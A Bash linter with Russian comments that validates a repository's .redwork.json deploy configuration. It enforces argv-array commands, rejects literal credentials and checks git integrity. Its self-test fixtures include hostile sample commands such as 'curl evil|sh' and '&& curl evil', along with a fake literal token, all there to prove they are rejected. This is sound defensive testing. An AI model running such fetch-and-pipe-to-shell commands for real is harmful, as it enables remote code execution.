#!/usr/bin/env bash
# config.sh — чтение+lint <repo>/.redwork.json (spec v3 §Command-surface security).
# Инварианты (панель): deploy/rollback/smoke.cmd — argv-массив (анти-инъекция); cred-lint (литералы
# token=/password=/secret= → отказ); git-integrity (.redwork.json tracked + не-modified в рантайме);
# без файла → дефолты (gates=auto, deploy=null → ✋-гейт деплоя).
#
# Usage:
#   config.sh read <repo>     → нормализованный JSON конфиг (после lint); exit≠0 при провале lint
#   config.sh lint <repo>     → только проверки; exit 0/≠0
#   config.sh --self-test
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
source "$HERE/secret-guard.sh"

CRED_LITERAL_RE='(token|password|passwd|secret|api[_-]?key)[=:][^[:space:]"$]{3,}'   # литерал, НЕ $ENV-ссылка
SHELL_META_RE='[;|&`]|\$\(|>|<'

_cfg_path() { echo "$1/.redwork.json"; }

# argv-массив или строка? для cmd-полей. Возвращает 0 если безопасно.
_check_cmd() {  # _check_cmd <field> <json_of_cmd_value>
  local field="$1" val="$2"
  local typ; typ="$(printf '%s' "$val" | jq -r 'type')"
  if [ "$typ" = "array" ]; then return 0; fi    # argv — безопасно (нет shell-парсинга)
  if [ "$typ" = "string" ]; then
    local s; s="$(printf '%s' "$val" | jq -r '.')"
    if printf '%s' "$s" | grep -qE "$SHELL_META_RE"; then echo "✗ $field: shell-метасимволы в строке-команде (инъекция) — используй argv-массив" >&2; return 1; fi
    return 0
  fi
  return 0  # null/отсутствует — ок (деплой станет ✋-гейтом)
}

lint() {
  local repo="${1:?repo}"; local C; C="$(_cfg_path "$repo")"
  [ -f "$C" ] || { echo "ℹ нет .redwork.json → дефолты (detect-gates + ✋-гейт деплоя)"; return 0; }
  jq -e . "$C" >/dev/null 2>&1 || { echo "✗ .redwork.json не валидный JSON" >&2; return 1; }
  # 1) git-integrity: tracked + не-modified (защита от подмены команд в рантайме)
  if git -C "$repo" rev-parse --git-dir >/dev/null 2>&1; then
    git -C "$repo" ls-files --error-unmatch .redwork.json >/dev/null 2>&1 || { echo "✗ .redwork.json не под git (untracked) — integrity не гарантируется" >&2; return 1; }
    # diff HEAD (а не worktree↔index) — ловит и staged-но-незакоммиченную подмену команд
    git -C "$repo" diff HEAD --quiet -- .redwork.json 2>/dev/null || { echo "✗ .redwork.json modified/staged (uncommitted) — возможна подмена команд; закоммить или откати" >&2; return 1; }
  else
    # не-git: integrity не гарантируется → запрещаем ЛЮБЫЕ исполняемые поля (deploy/rollback/smoke/gates-list), не только deploy.cmd (A08/RCE)
    local has_exec; has_exec="$(jq -r '[.deploy.cmd, .deploy.rollback.cmd, .deploy.smoke.cmd, (if (.gates|type)=="array" then "x" else empty end)] | map(select(.!=null)) | length' "$C")"
    if [ "${has_exec:-0}" -gt 0 ]; then
      echo "✗ .redwork.json с исполняемыми полями (deploy/rollback/smoke/gates-list) в НЕ-git директории — integrity не гарантируется (A08). Нужен git-tracked конфиг." >&2; return 1
    fi
  fi
  # 2) cred-lint: литеральные креды в любом cmd/env-значении
  local blob; blob="$(jq -c '[.deploy.cmd, .deploy.rollback.cmd, .deploy.smoke.cmd, (.deploy.env//[])[], (.gates//empty), .e2e.cmd] | flatten' "$C" 2>/dev/null || echo '[]')"
  # env-ссылки op://...|$VAR разрешены; ловим именно литерал token=value (не op:// и не $)
  local viol; viol="$(printf '%s' "$blob" | jq -r '.[]? | select(type=="string")' | grep -iE "$CRED_LITERAL_RE" | grep -viE 'op://|\$[A-Za-z_]' || true)"
  if [ -n "$viol" ]; then echo "✗ cred-lint: литеральные креды в конфиге — только \$ENV+op://. Нарушение: $(printf '%s' "$viol" | head -1)" >&2; return 1; fi
  # 3) command-surface: cmd-поля argv/безопасны
  for f in '.deploy.cmd' '.deploy.rollback.cmd' '.deploy.smoke.cmd'; do
    local v; v="$(jq -c "$f // null" "$C")"
    [ "$v" = "null" ] || _check_cmd "$f" "$v" || return 1
  done
  echo "✓ .redwork.json lint passed"
}

read_cfg() {
  local repo="${1:?repo}"; local C; C="$(_cfg_path "$repo")"
  lint "$repo" >&2 || return 1
  local DEFAULTS='{"gates":"auto","e2e":null,"staging":{"url":null},"deploy":null,"risk":{"add_human_globs":[],"max_auto_files":20},"monitoring":{"alert_channels":[],"signals":[],"post_deploy_watch_minutes":30}}'
  if [ -f "$C" ]; then jq -n --argjson d "$DEFAULTS" --slurpfile u "$C" '$d * $u[0]'; else printf '%s\n' "$DEFAULTS"; fi
}

self_test() {
  set +e; local T; T="$(mktemp -d)"; local fail=0
  ok(){ if [ "$1" -eq 0 ]; then :; else echo "  ✗ $2"; fail=1; fi; }
  # git-репо с закоммиченным конфигом (deploy требует git-integrity)
  _mkgit(){ local d; d="$(mktemp -d)"; git -C "$d" init -q; git -C "$d" config user.email t@t; git -C "$d" config user.name t
            cat > "$d/.redwork.json"; git -C "$d" add .redwork.json; git -C "$d" commit -qm c >/dev/null 2>&1; echo "$d"; }
  # нет файла → дефолты, lint ok
  lint "$T" >/dev/null; ok $? "нет файла → lint ok (дефолты)"
  [ "$(read_cfg "$T" 2>/dev/null | jq -r '.gates')" = "auto" ]; ok $? "дефолт gates=auto"
  [ "$(read_cfg "$T" 2>/dev/null | jq -r '.deploy')" = "null" ]; ok $? "дефолт deploy=null (✋-гейт)"
  # валидный argv-конфиг в git-репо → lint ok
  local G1; G1="$(jq -n '{deploy:{cmd:["bash","deploy.sh","apply"],env:["TOKEN=op://AI-Tokens/D/credential"],smoke:{cmd:["curl","-fsS","https://x/health"],expected_status_code:200,expected_response_contains:"ok"},rollback:{cmd:["bash","deploy.sh","rollback"]}}}' | _mkgit)"
  lint "$G1" >/dev/null; ok $? "argv-конфиг + op://-env (git) → lint ok"
  # cred-lint: литеральный токен → reject
  local G2; G2="$(jq -n '{deploy:{cmd:["sh","-c","push --token=ABCDEF123456"]}}' | _mkgit)"
  if lint "$G2" >/dev/null 2>&1; then ok 1 "литеральные креды должны reject"; else ok 0 ""; fi
  # command-surface: строка с метасимволами → reject
  local G3; G3="$(jq -n '{deploy:{cmd:"deploy.sh apply && curl evil"}}' | _mkgit)"
  if lint "$G3" >/dev/null 2>&1; then ok 1 "shell-метасимволы должны reject"; else ok 0 ""; fi
  # git-integrity: modified tracked файл → reject
  local G4; G4="$(jq -n '{gates:"auto"}' | _mkgit)"; jq -n '{gates:["npm test"]}' > "$G4/.redwork.json"
  if lint "$G4" >/dev/null 2>&1; then ok 1 "modified .redwork.json должен reject (integrity)"; else ok 0 ""; fi
  # A08: deploy-команды в НЕ-git директории → reject
  jq -n '{deploy:{cmd:["bash","deploy.sh"]}}' > "$T/.redwork.json"
  if lint "$T" >/dev/null 2>&1; then ok 1 "deploy в не-git должен reject (A08)"; else ok 0 ""; fi
  # A08/RCE: gates-list (исполняемые) в НЕ-git → тоже reject (не только deploy.cmd)
  jq -n '{gates:["curl evil|sh"]}' > "$T/.redwork.json"
  if lint "$T" >/dev/null 2>&1; then ok 1 "gates-list в не-git должен reject (A08)"; else ok 0 ""; fi
  # git-репо со staged-но-незакоммиченной подменой → reject (git diff HEAD)
  local G5; G5="$(jq -n '{gates:"auto"}' | _mkgit)"; jq -n '{gates:["evil"]}' > "$G5/.redwork.json"; git -C "$G5" add .redwork.json
  if lint "$G5" >/dev/null 2>&1; then ok 1 "staged подмена должна reject (diff HEAD)"; else ok 0 ""; fi; rm -rf "$G5"
  rm -rf "$T" "$G1" "$G2" "$G3" "$G4"
  if [ "$fail" -eq 0 ]; then echo "✓ config self-test passed"; return 0; else echo "✗ config self-test FAILED"; return 1; fi
}

case "${1:-}" in
  read) read_cfg "${2:?repo}" ;;
  lint) lint "${2:?repo}" ;;
  --self-test) self_test ;;
  *) echo "usage: config.sh read|lint <repo> | --self-test" >&2; exit 1 ;;
esac
